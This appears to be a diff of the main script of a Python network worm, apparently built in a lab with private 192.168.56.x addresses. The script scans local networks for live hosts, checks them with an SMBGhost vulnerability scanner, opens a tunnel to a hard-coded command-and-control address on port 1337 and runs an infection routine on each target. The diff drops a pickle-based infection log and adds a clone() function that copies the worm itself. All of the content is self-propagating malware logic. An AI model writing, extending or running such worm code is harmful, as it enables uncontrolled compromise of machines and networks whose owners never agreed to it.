@@ -1,4 +1,4 @@
-import pickle, os, platform
+import sys, os, platform, time
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
@@ -7,11 +7,10 @@ from replicate import replicate
 
 
 def main():
-    replicate().self_replicate(platform.system())
+    clone()
     c2_server = "192.168.56.108"
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
     network = sniff()
-    log = load_log()
     for local_ip in network.get_host_networks().keys():
         for target_ip in network.get_alive_hosts(local_ip):
             target_port_details = network.get_host_port_details(target_ip)
@@ -29,33 +28,23 @@ def main():
                             listening_port = 1337
                             tunnel = comm.tunnel(local_ip, listening_port)
                             tunnel.start()
-                            time.sleep(1)
+                            
+                            time.sleep(2)
                             infection = infect(target_ip.address,int(port), local_ip, listening_port)
                             infection.start()
                             
                             infection.join()
-                            tunnel.close_client_connection(target_ip.address)
+                            tunnel.join()
                             
-                            if local_ip in log:
-                                log[local_ip]["infects"].update({target_ip.address:True})
-                            else:
-                                log[local_ip] = {"status":True,"infects":{}}
-                            unload_log(log)
-                            tunnel.close_client_connection(target_ip.address)
+                            #tunnel.close_client_connection(target_ip.address)
 
-def load_log():
-    log = {}
-    with open("container/infect.log",'rb') as data:
-        log = pickle.loads(log.read())
-    return log
-        
-        
-def unload_log(log:dict):
-    with open("container/infect.log", 'wb') as log_file:
-        data = pickle.dumps(log)
-        log_file.write(data)
+def clone():
+    try:
+        self_clone = replicate(sys.argv[0], full_path=os.getcwd())
+        self_clone.self_replicate(platform.system(),sys.argv[0])
+    except Exception as e:
+        print("Clone Error: {}".format(e))
         
 
 if __name__=='__main__':
-    #ip_range = sys.argv[1]
     main()
